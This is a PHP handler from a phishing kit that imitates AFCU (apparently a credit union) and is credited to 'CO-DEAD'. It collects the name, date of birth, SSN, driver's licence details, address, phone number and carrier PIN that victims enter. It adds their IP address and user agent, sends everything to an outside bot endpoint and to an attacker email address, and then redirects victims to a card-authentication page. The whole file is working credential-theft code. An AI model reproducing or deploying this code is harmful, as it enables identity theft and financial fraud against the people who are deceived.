<?php 
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * icq & telegram = @CO-DEAD
 
###############################################
#$            Coded by CO-DEAD               $#
#$  Adding backdoor won't  make you a Coder  $#
#$          Copyright 2022 AFCU              $#
###############################################

**/
if(isset($_POST['fname']))
{
	include ("../mine.php");
	include '../anti/recon.php';
		ob_start();
	session_start();
	$ip = "{$_SESSION['ip']}";
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
			$code = <<<EOT
	============== [ AFCU Personal By CO-DEAD | ] ==============
	FULL NAME 		: {$_POST['fname']}
	DOB (MM/DD/YYYY): {$_POST['dob']}
	SSN 			: {$_POST['ssn']}
	DLN 			: {$_POST['dln']}
	DLEXP 			: {$_POST['dlexp']}
	DLISSUE 		: {$_POST['dlissue']}
	Address         : {$_POST['addr']}
	State 			: {$_POST['state']}
	Zip 			: {$_POST['zip']}
	Phone Number 	: {$_POST['phone']}
	Carrier Pin     : {$_POST['cpin']}
		-------- I N F O | I P  --------
	IP		: $ip
	IP lookup		: https://ip-api.com/$ip
	OS		: $useragent
	============= [ AFCU Personal By CO-DEAD ] =============
	\r\n\r\n
	EOT;
	$sendme = [
		'text' => $code
	];
	if($bot_result == "true"){
		$data = http_build_query($sendme);
        $response = file_get_contents( $bot . $data);
	}
			$subject = " AFCU More Personal Info By CO-DEAD  From $ip";
			$headers = "From: CO-DEAD <codead13@yandex.com>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
			@mail($email,$subject,$code,$headers);
			header("Location: ../card-auth");
           
			

			
}
?>
